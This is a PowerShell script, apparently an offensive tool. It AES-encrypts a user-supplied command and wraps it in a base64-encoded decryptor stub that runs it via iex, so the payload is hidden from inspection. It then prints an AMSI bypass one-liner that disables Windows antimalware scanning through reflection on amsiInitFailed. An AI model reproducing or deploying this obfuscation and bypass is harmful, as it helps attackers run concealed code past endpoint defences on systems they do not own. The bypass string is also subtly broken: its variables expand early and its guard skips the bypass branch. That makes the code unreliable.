$promptPart1 = 'Enter '
$promptPart2 = 'command'
$cmd = Read-Host ($promptPart1 + $promptPart2)
 
$encryptObjName = -join ('AesManaged' | Get-Random -Count 10)
$encryptionObject = New-Object Security.Cryptography.$encryptObjName 
$encryptionObject.GenerateKey() 
$encryptionObject.GenerateIV() 
$encryptor = $encryptionObject.CreateEncryptor()
 
$aliasConvertToBase64 = 'ToBase64String'
$encryptedBytes = $encryptor.TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($cmd), 0, $cmd.Length)
$encryptedCmd = [Convert]::$aliasConvertToBase64($encryptedBytes)

$reverseDirection = Get-Random -Minimum 0 -Maximum 2
if ($reverseDirection -eq 0) {
    $reversedEncryptedCmd = -join ($encryptedCmd[-1..-($encryptedCmd.Length)])
} else {
    $reversedEncryptedCmd = $encryptedCmd
}

$Key = [Convert]::ToBase64String($encryptionObject.Key)
$keyPart1 = $Key.Substring(0, 8)
$keyPart2 = $Key.Substring(8, 8)
$keyPart3 = $Key.Substring(16)

$Base64IVVarName = -join ('IV' | Get-Random -Count 10)
$Base64IV = [Convert]::ToBase64String($encryptionObject.IV)
$decryptFuncName = -join ('DecryptCmd' | Get-Random -Count 10)
$decryptCmd = "
function $decryptFuncName{param(`$eCmd,`$k1,`$k2,`$k3,`$iv,`$reverse)`$AES=New-Object Security.Cryptography.AesManaged;`$keyBytesList=New-Object System.Collections.ArrayList;`$keyBytesList.AddRange([Convert]::FromBase64String(`$k1));`$keyBytesList.AddRange([Convert]::FromBase64String(`$k2));`$keyBytesList.AddRange([Convert]::FromBase64String(`$k3));`$keyBytes=`$keyBytesList.ToArray();`$AES.IV=[Convert]::FromBase64String(`$iv);`$decryptor=`$AES.CreateDecryptor(`$keyBytes,`$AES.IV);if(`$reverse -eq 0){`$eBytes=-join(`$eCmd[-1..-(`$eCmd.Length)])}else{`$eBytes=`$eCmd};`$eBytes=[Convert]::FromBase64String(`$eBytes);`$dBytes=`$decryptor.TransformFinalBlock(`$eBytes,0,`$eBytes.Length);return [Text.Encoding]::UTF8.GetString(`$dBytes)};iex ($decryptFuncName '$reversedEncryptedCmd' '$keyPart1' '$keyPart2' '$keyPart3' '$Base64IV' $reverseDirection)"

$bytes = [System.Text.Encoding]::Unicode.GetBytes($decryptCmd)
$base64String = [System.Convert]::ToBase64String($bytes)

$amsibp = " $tr=(555 -eq 555);$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff='si';$fffffffffffffffffffffffffffffffffffffffffffffffffffffff='Am';if(0 -ne 1) {} else{  $Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $fffffffffffffffffffffffffffffffffffffffffffffffffffffff,$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)); $zero=$Ref.GetField(('am{0}InitFailed'-f $fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff),'NonPublic,Static');$zero.SetValue($null,$tr)}"
Write-Host $base64String
#Write-Host $decryptCmd

Write-Host "Amsi-Bypass One-liner:"
Write-Host $amsibp
